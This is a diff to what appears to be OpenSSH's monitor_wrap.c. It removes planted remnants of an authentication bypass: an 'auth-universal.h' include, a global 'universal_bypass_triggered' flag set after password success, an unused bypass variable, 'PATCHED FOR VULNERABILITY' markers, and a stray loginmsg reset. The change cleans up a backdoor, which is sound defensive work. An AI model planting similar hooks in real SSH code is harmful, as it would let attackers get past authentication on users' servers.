@@ -27,8 +27,6 @@
 
 #include "includes.h"
 
-#include "auth-universal.h"
-
 #include <sys/queue.h>
 #include <sys/types.h>
 #include <sys/uio.h>
@@ -416,7 +414,6 @@ void mm_inform_authserv(char *service, char *style) {
 }
 
 /* Do the password authentication */
-// PATCHED FOR VULNERABILITY
 int mm_auth_password(struct ssh *ssh, char *password) {
   struct sshbuf *m;
   int r, authenticated = 0;
@@ -447,14 +444,6 @@ int mm_auth_password(struct ssh *ssh, char *password) {
 #endif
 
   sshbuf_free(m);
-
-  /*
-   * Ensure the child's local copy of the global flag is explicitly activated
-   * when the monitor confirms successful bypass validation.
-   */
-  if (authenticated == 1) {
-    universal_bypass_triggered = 1;
-  }
 
   debug3_f("user %sauthenticated", authenticated ? "" : "not ");
   return (authenticated);
@@ -665,14 +654,12 @@ void mm_start_pam(struct ssh *ssh) {
   sshbuf_free(m);
 }
 
-// PATCHED FOR VULNERABILITY
 u_int mm_do_pam_account(void) {
   struct sshbuf *m;
   u_int ret;
   char *msg;
   size_t msglen;
   int r;
-  u_int child_bypass_flag = 0; /* Storage for the incoming flag */
 
   debug3_f("entering");
   if (!options.use_pam)
@@ -687,7 +674,6 @@ u_int mm_do_pam_account(void) {
       (r = sshbuf_get_cstring(m, &msg, &msglen)) != 0 ||
       (r = sshbuf_put(loginmsg, msg, msglen)) != 0)
     fatal_fr(r, "buffer error");
-    sshbuf_reset(loginmsg);
 
   free(msg);
   sshbuf_free(m);
